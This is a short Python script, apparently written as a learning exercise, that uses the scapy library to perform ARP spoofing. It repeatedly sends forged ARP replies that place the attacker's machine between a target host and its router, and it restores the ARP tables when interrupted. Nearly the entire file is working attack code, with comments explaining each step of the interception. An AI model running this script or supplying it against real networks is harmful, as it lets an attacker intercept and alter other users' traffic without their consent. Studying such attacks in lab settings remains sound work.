import scapy.all as scapy
import time

def get_mac(ip):
    # Create an Address Resolution Protocol (ARP) request to ask who has the specific IP we asked for
    arp_request = scapy.ARP(pdst = ip)

    # Set destination MAC to broadcast MAC address to make sure it is sent to all clients on subnet
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    # hwsrc is the mac address
    return answered_list[0][1].hwsrc

# op is 2 because op=1 means a request whereas op=2 is a response
# This crafts a response for the victim saying my machine is the router
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)

# Restore back to defaults
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    # Count makes packet send 4 times so higher likelyhood ARP tables are reset
    scapy.send(packet, count = 4, verbose = False)


target_ip = "10.0.2.15"
router_ip = "10.0.2.1"

sent_packets_count = 0

# Need to continually send spoof packets until attack is over
try:
    while True:
        # Tell target computer that I am the router
        spoof(target_ip, router_ip) 
        # Tell router that I am the target computer
        spoof(router_ip, target_ip)
        sent_packets_count = sent_packets_count + 2
        print(f'\rSent {sent_packets_count} packets...', end = "")
        time.sleep(2)
except KeyboardInterrupt:
    print("\nDetected CTRL + C ... Resetting ARP tables ...")
    # Give target correct address of router
    restore(target_ip, router_ip)
    # Give router correct address of target
    restore(router_ip, target_ip)
    print("\nFinished!")